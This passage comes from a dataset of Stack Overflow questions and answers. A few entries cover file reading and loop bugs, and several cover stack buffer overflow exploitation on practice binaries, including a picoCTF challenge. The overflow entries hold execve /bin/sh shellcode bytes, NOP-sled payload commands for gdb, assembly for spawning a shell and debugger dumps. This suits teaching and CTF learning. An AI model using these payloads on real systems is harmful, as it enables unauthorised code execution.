        "Question": "When reading a simple file, I keep overflowing and reading bytes out of the file despite making sure I get the size of the file in bytes prior to the read.\nHere is my current code:\nFILE* file;\nint error_no = fopen_s(&file, filepath, \"r\");\n\nif (error_no != 0 || file == 0) {\n    std::cout << \"Error whilst reading file: \" + error_no;\n}\n\nfseek(file, 0, SEEK_END);\nsize_t size = ftell(file);\n\nchar* fileAsString = (char*) malloc(size+1);\n\nfseek(file, 0, SEEK_SET);\nfread(fileAsString, 1, size, file);\n\nfileAsString[size] = 0;\n\nstd::cout << \"\\n\" << size << \"\\n\";\nstd::cout << fileAsString;\n\nfclose(file);\n\nI am expecting to open the file, push the stream to the end of the file and use ftell to find the number of characters in the file.\nThen I make a string buffer to copy the file's content into.\nThen finally I reset the file stream and read it into my string buffer. I complete this by adding the end-of-string character at the end of the buffer.\nSadly this is what I get:\n114\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n        color = vec4(1.0, 0.0, 0.0, 1.0);\n}\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nI checked and the file contains 107 characters, which explains the 114 length and 7 '=' characters that shouldn't be there.\nThe actual file contents are:\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n    color = vec4(1.0, 0.0, 0.0, 1.0);\n}\n\nHope this is clear enough!\n",
        "Answer": "When you read a file with \"r\" mode, you are reading in text mode and your two-byte \\r\\n line endings are being converted to \\n strings in memory.  But ftell is returning the length of the file in bytes (with each newline counting for two bytes).  But you are marking the end of the string (by setting a null character) according to how  many bytes were in the file, as opposed to how many characters are in the string.  Since you have placed your null terminator past the end of the string, you have one character of junk for each newline in your original file.\nInstead, you probably want to preserve the bytes of the original file. To do this, try opening the file in \"rb\" mode to read it in binary mode which should prevent it from changing \\r\\n in the file to \\n in the string in memory.\n",
        "Source": "https://stackoverflow.com/questions/76958048/overflow-when-reading-a-file"
    },
    {
        "Title": "Index overflow in for loop with nested thread",
        "Question": "I am writing a testing utility (a WinForm) to check how a web site perform. To do so i set a number of request to make, with a list of parameters associated with requests. I can set the requests to happen in parallel or in sequence.\nIf i work in sequence everything is fine, but if i work in parallel i get a strange issue with the for loop.\nI know i may use Parallel.For but because i am investigating another bug related to parallelism i temporary used a regualr for, with a nested action executed directly or with a Task.Run().\nHere the problematic code :\nprivate void Run()\n{\n    ConcurrentBag<long> callTimes = new ConcurrentBag<long>();\n    int httpErrors = 0;\n    int progress = 0;\n\n    string uri = txtUrl.Text ?? string.Empty;\n    if (string.IsNullOrWhiteSpace(uri))\n        return;\n\n    Func<List<string>,int,long> testCall = (p,i) =>\n    {\n        try\n        {\n            using (var client = new HttpClient())\n            {\n                Stopwatch timer = new Stopwatch();\n                timer.Start();\n\n                string actualUrl = string.Format(uri, p.ToArray());\n                var getTask = client.GetAsync(actualUrl);\n                getTask.Wait();\n\n                timer.Stop();\n\n                var result = getTask.Result;\n                if (result == null || (int)result.StatusCode >= 400)\n                {\n                    txtErrors.ThreadSafeAppendText($\"Connection error {(result?.StatusCode.ToString() ?? \"NULL\")}'\\r\\n\");\n                    Interlocked.Increment(ref httpErrors);\n                }\n\n                return timer.ElapsedMilliseconds;\n            }\n        }\n        catch ( Exception actionErr)\n        {\n            txtErrors.ThreadSafeAppendText($\"Error while execution callAction {i} with parameters '{string.Join(\", \" , p)}' : \\r\\n\" + actionErr.Message);\n        }\n\n        return -1;\n    };\n\n    try\n    {\n        List<List<string>> parameters = this.ParseParameters();\n        int parametersCount = parameters.Count;\n        int executions = (int)updRequests.Value;\n\n        //used to randomly access parameters in a way suitable also for the parallel scenario (i precompute all the random number i need while parallel processing is not yet started)\n        Random rng = new Random();\n        List<int> randoms = new List<int>();\n        for (int i = 0; i < executions; i++)\n            randoms.Add(rng.Next(0, parametersCount));\n\n        //randoms.Count is guaranteed to be equal to executions \n\n\n        for ( int index = 0; index < executions; index++)\n        {\n            Action parallelAction = () =>\n            {\n                int currentIndex = index;\n                List<string> currentParameter = parameters[randoms[currentIndex] % parametersCount]; //<<--- strange overflow here currentIndex >= executions\n                callTimes.Add(testCall(currentParameter, currentIndex));\n\n                Interlocked.Increment(ref progress);\n\n                if (progress % 10 == 0)\n                    prbProgress.ThreadSafeAction(this.RefreshProgressBar, progress, executions);\n            };\n\n            if (chkParallelExecution.Checked)\n                Task.Run(parallelAction);\n            else\n                parallelAction();\n        }\n\n\n        this.Reporting(callTimes, httpErrors);\n    }\n    catch (Exception err)\n    {\n        txtErrors.ThreadSafeAppendText($\"Error while running stress test : \\r\\n\" + err.Message);\n    }\n}\n\nThe strange thing i don't understand is how the variable called currentIndex become >= executions variable, because only the loop manipulate those two variable and should enforce the opposite.\nSo i think i am missing something in my understanding on how parallel processing happen here.\n",
        "Answer": "There is a fairly well known issue with capturing loop variables.\nSo you should probably write\nfor ( int index = 0; index < executions; index++)\n{\n    int currentIndex = index;\n    Action parallelAction = () =>\n    {\n        ...\n\nAnother possible issue:\nparameters[randoms[currentIndex] % parametersCount];\n\nFor all you know the values in randoms could all be zero. Are you sure you don't want to create an array of 0..executions, and shuffle this instead?\nI can't see any obvious reasons why this example should fail however. But errors with indices etc should be rather obvious if you do some debugging.\n",
        "Source": "https://stackoverflow.com/questions/76874536/index-overflow-in-for-loop-with-nested-thread"
    },
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 